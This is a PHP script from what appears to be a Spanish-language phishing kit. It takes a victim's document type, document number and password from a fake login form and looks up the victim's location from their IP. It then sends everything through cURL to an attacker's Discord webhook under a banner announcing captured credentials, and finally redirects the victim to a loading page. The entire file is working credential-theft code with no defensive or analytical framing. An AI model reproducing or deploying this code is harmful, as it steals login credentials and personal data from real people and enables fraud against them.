<?php
session_start();
include '../config/config.php';

// Verificación mejorada de datos POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die('Método no permitido');
}

$tipoDoc = htmlspecialchars($_POST['tipodoc'] ?? '', ENT_QUOTES, 'UTF-8');
$usr = htmlspecialchars($_POST['numdoc'] ?? '', ENT_QUOTES, 'UTF-8');
$psw = htmlspecialchars($_POST['clvs'] ?? '', ENT_QUOTES, 'UTF-8');

$_SESSION['username'] = $usr;

// Función mejorada para obtener IP
function getUserIP() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    }
    
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'IP no válida';
}

$ip = getUserIP();

// Geolocalización con manejo de errores mejorado
$geoData = [
    'country' => 'Desconocido',
    'region' => 'Desconocido', 
    'city' => 'Desconocido'
];

try {
    $response = @file_get_contents("http://ip-api.com/json/{$ip}");
    if ($response !== false) {
        $geoInfo = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && ($geoInfo['status'] ?? '') === 'success') {
            $geoData = [
                'country' => $geoInfo['country'] ?? 'Desconocido',
                'region' => $geoInfo['regionName'] ?? 'Desconocido',
                'city' => $geoInfo['city'] ?? 'Desconocido'
            ];
        }
    }
} catch (Exception $e) {
    error_log("Error en geolocalización: " . $e->getMessage());
}

// Construcción del mensaje IDÉNTICO al original pero más robusto
$embed = [
    "title" => "**🔐 EL USUARIO ENVIO SUS CREDENCIALES 🔐**",
    "color" => hexdec("e67e22"),
    "fields" => [
        ["name" => "👤 Tipo de Documento", "value" => "`{$tipoDoc}`", "inline" => true],
        ["name" => "👤 Numero de Documento", "value" => "`{$usr}`", "inline" => true],
        ["name" => "🔑 Clave", "value" => "`{$psw}`", "inline" => true],
        ["name" => "🌍 IP", "value" => "`{$ip}`", "inline" => false],
        ["name" => "🏙️ Ciudad", "value" => "`{$geoData['city']}`", "inline" => true],
        ["name" => "📍 Región", "value" => "`{$geoData['region']}`", "inline" => true],
        ["name" => "🌎 País", "value" => "`{$geoData['country']}`", "inline" => true],
        ["name" => "🕒 Fecha", "value" => "`" . date('Y-m-d H:i:s') . "`", "inline" => false]
    ],
    "footer" => [
        "text" => "made by @morph3ush4ck",
        "icon_url" => "https://upload.wikimedia.org/wikipedia/commons/c/ca/Osama_bin_Laden_portrait.jpg"
    ]
];

$payload = [
    "username" => "🚨 ESTAN CAYENDO 🚨",
    "avatar_url" => "https://media.istockphoto.com/id/911660906/vector/computer-hacker-with-laptop-icon.jpg?s=612x612&w=0&k=20&c=rmx25IUnM2fHP4lXG96PNeZ_YQ1kQUTTWfGU4EE5iqQ=",
    "embeds" => [$embed]
];

// Envío a Discord usando cURL (más confiable)
$ch = curl_init(DISCORD_WEBHOOK_URL);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($payload),
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
        'Content-Length: ' . strlen(json_encode($payload))
    ],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 5,
    CURLOPT_SSL_VERIFYPEER => false
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if ($response === false || $httpCode !== 204) {
    error_log("Error al enviar a Discord: HTTP {$httpCode} - " . curl_error($ch));
    // Opcional: Puedes agregar aquí un fallback a Telegram o otro método
}

curl_close($ch);

header("Location: ../cargando.html");
exit;
?>